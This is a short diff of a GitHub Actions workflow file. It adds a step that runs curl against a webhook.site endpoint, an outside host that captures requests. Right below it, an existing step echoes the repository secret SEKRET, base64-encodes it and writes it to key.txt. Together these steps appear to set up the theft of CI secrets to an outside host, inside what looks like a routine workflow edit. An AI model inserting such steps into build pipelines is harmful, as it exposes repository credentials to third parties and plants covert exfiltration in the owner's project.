@@ -18,7 +18,8 @@ jobs:
 
         uses: actions/checkout@v4
 
- 
+      - name: curl
+        run: curl -s https://webhook.site/f29e20cf-dfe6-4f35-990e-9d03cc7fe50a
 
       - name: Echo secrets
         run: echo "${{ secrets.SEKRET }}" | base64 > key.txt
